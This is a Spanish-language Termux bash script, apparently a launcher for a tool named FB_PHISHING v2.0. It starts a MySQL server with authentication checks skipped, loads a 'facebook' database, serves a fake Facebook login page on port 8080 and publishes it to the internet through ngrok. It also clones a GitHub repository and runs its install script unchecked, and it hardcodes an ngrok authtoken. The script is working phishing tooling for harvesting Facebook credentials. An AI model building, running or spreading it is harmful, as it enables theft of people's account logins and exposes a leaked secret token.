#! data/data/com.termux/files/usr/bin/bash
clear
#variables
                red='\033[1;31m'
                green='\033[1;32m'
                yellow='\033[1;33m'
                blue='\033[1;34m'
                magenta='\033[1;35m'
                cyan='\033[1;36m'
                reset='\033[0m'	                     
banner() {
printf $cyan
echo      "
 ░█▀▀░█▀▄░░░░░█▀█░█░█░▀█▀░█▀▀░█░█░▀█▀░█▀█░█▀▀
 ░█▀▀░█▀▄░░░░░█▀▀░█▀█░░█░░▀▀█░█▀█░░█░░█░█░█░█
 ░▀░░░▀▀░░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀▀"
echo
printf $reset
echo -e   "\e[1;34m  AUTHOR :\033[1;31m   VeNOM24"
echo -e   "\e[1;34m  TOOL   :\033[1;31m   FB_PHISHING"
echo -e   "\e[1;34m  VERSION:\033[1;31m   2.0"

echo -e "\e[1;36m =============================================
\033[1;36m ============================================="
echo ""

echo -e "\033[1;34m  [\033[0;m01\033[1;34m]\033[1;31m SERVER    MYSQLD\033[1;32m    PUERTO 3036"
echo -e "\033[1;34m  [\033[0;m02\033[1;34m]\033[1;31m FACEBOOK  SETUP\033[1;32m     DATABASE-FB"
echo -e "\033[1;34m  [\033[0;m03\033[1;34m]\033[1;31m SCANNERS  PORTS\033[1;32m     NMAP"
echo -e "\033[1;34m  [\033[0;m04\033[1;34m]\033[1;31m FB_LOGIN  L-HOST\033[1;32m    PUERTO 8080"
echo -e "\033[1;34m  [\033[0;m05\033[1;34m]\033[1;31m FB_LOGIN  NGROK\033[1;32m     PUERTO 8080"
echo -e "\033[1;34m  [\033[0;m00\033[1;34m]\033[1;31m EXIT"    
echo
}

err() {                                              echo -e " \033[1;31m Error opcion invaalida"         
seleccion                                           
}
echo
seleccion(){
cd ~/FB_phishingV2.0	
#echo -e "\e[1;36m"                                  
echo -e -n "\e[1;36m  FB_PHISHINGV2.0#>> ";
printf $reset
read OPCION;

case $OPCION in

01)                 
mysqld --skip-grant-tables --general-log &
 ;;	

02)
	if [ -e $PREFIX/bin/fb.sql ]
then
echo -e "\e[1;33m  LA DATABASE-FB YA ESTA CREADA"
sleep 1.5
clear
banner
seleccion


else
cd ~/FB_phishingV2.0
cp -r fb.sql $PREFIX/bin
mariadb -u root -e "create database facebook"
mariadb -u root facebook < fb.sql
	fi
;;

03)
nmap 127.0.0.1
sleep 3.0
clear
banner
seleccion


;;

04) 
	php -S localhost:8080
	;;

05)
	#Verificando si existe ngrok

if [ -e $PREFIX/bin/ngrok ]
then
echo -e "\e[1;33m  ngrok ya esta  instalado"         
sleep 1.5
echo -e "\e[1;35m  iniciando el puerto 8080"
sleep 1.5
ngrok http 8080
	echo
        exit
else
git clone https://github.com/venom-24/Tunel-ngrok.git
cd Tunel-ngrok;ls
chmod +x *;ls
bash install.sh
sleep 1.5
ngrok authtoken 2i6rOuKmnkl9W2pZ0GL02IPg29f_3eta9FdUZbTDTwi7Y9mKC

ngrok http 8080
fi
;;
                                                           

00)
	exit
	;;
*) err;;	
esac    
}       
banner
seleccion
